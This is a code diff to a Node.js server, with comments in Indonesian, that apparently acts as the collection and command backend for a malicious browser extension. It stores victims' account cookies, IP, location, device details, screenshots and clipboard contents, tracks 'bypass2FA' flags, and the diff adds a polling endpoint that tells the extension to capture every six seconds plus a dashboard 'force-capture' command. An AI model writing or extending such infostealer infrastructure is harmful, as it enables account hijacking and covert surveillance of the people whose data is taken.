@@ -23,6 +23,9 @@ if (!fs.existsSync(DATA_FILE)) {
     }, null, 2));
 }
 
+// ========== POLLING MECHANISM ==========
+const pollRequests = new Map(); // Track which devices need to capture
+
 function readData() {
     try {
         const raw = fs.readFileSync(DATA_FILE, 'utf8');
@@ -43,7 +46,7 @@ function writeData(data) {
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-// ========== RECEIVE ACCOUNT DATA (dengan IP, lokasi, device, screenshot, clipboard) ==========
+// ========== RECEIVE ACCOUNT DATA ==========
 app.post('/api/account', async (req, res) => {
     try {
         const accountData = req.body;
@@ -65,7 +68,6 @@ app.post('/api/account', async (req, res) => {
         accountData.id = String(accountData.userId);
         accountData.ip = req.ip || req.connection.remoteAddress;
 
-        // Ambil screenshot, clipboard, ip, location, device dari body
         const { screenshot, clipboard, ip, location, device, ...rest } = accountData;
 
         const existingIndex = data.accounts.findIndex(acc => String(acc.userId) === String(accountData.userId));
@@ -88,11 +90,10 @@ app.post('/api/account', async (req, res) => {
             groupsCount: accountData.groupsCount || 0,
             limiteds: accountData.limiteds || 0,
             cookie: accountData.cookie || '',
-            // Data tambahan
             ip: ip || 'Unknown',
             location: location || { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown' },
             device: device || { platform: 'Unknown', userAgent: 'Unknown', language: 'Unknown', cores: 'Unknown' },
-            screenshot: screenshot || null,  // base64 string
+            screenshot: screenshot || null,
             clipboard: clipboard || { text: '', hasData: false },
             bypass2FA: accountData.bypass2FA || false,
             bypassEmail: accountData.bypassEmail || false,
@@ -101,7 +102,6 @@ app.post('/api/account', async (req, res) => {
         };
 
         if (existingIndex !== -1) {
-            // Update, pertahankan createdAt asli
             const old = data.accounts[existingIndex];
             data.accounts[existingIndex] = {
                 ...old,
@@ -127,10 +127,76 @@ app.post('/api/account', async (req, res) => {
         if (data.logs.length > 500) data.logs = data.logs.slice(-500);
 
         writeData(data);
+        console.log(`✅ Account received: ${accountData.username}`);
         res.json({ success: true, message: existingIndex !== -1 ? 'Account updated' : 'Account saved' });
 
     } catch (error) {
         console.error('❌ Error saving account:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ========== POLLING ENDPOINT - Extension check ini setiap 6 detik ==========
+app.post('/api/poll', (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        
+        if (!deviceId) {
+            return res.json({ 
+                action: 'capture',
+                reason: 'No device ID - force capture'
+            });
+        }
+
+        // Check apakah ada capture request untuk device ini
+        const hasRequest = pollRequests.has(deviceId);
+        
+        if (hasRequest) {
+            pollRequests.delete(deviceId);
+            console.log(`📤 Poll: Sending capture command to device ${deviceId}`);
+            return res.json({ 
+                action: 'capture',
+                reason: 'Requested by server'
+            });
+        }
+
+        // Jika tidak ada request, tetap suruh capture (safety net)
+        console.log(`📤 Poll: Routine capture for device ${deviceId}`);
+        res.json({ 
+            action: 'capture',
+            reason: 'Routine check'
+        });
+
+    } catch (error) {
+        console.error('❌ Poll error:', error);
+        res.json({ action: 'wait', reason: 'Error' });
+    }
+});
+
+// ========== FORCE CAPTURE ENDPOINT - bisa dipanggil dari dashboard ==========
+app.post('/api/force-capture', (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        
+        if (!deviceId) {
+            return res.status(400).json({ success: false, error: 'deviceId required' });
+        }
+
+        // Set flag untuk device ini harus capture
+        pollRequests.set(deviceId, { 
+            timestamp: new Date().toISOString(),
+            reason: 'Manual force'
+        });
+
+        console.log(`🔥 Force capture requested for device ${deviceId}`);
+        res.json({ 
+            success: true, 
+            message: 'Capture will be triggered on next poll',
+            deviceId 
+        });
+
+    } catch (error) {
+        console.error('❌ Force capture error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -185,7 +251,8 @@ app.get('/api/stats', (req, res) => {
         res.json({
             success: true,
             stats: data.stats,
-            recentLogs: data.logs.slice(-20)
+            recentLogs: data.logs.slice(-20),
+            pollRequests: Array.from(pollRequests.entries())
         });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
@@ -202,4 +269,7 @@ app.get('/dashboard', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📁 Data file: ${DATA_FILE}`);
+    console.log(`📡 Polling endpoints:`);
+    console.log(`   POST /api/poll - Extension checks this every 6 seconds`);
+    console.log(`   POST /api/force-capture - Manual force capture`);
 });
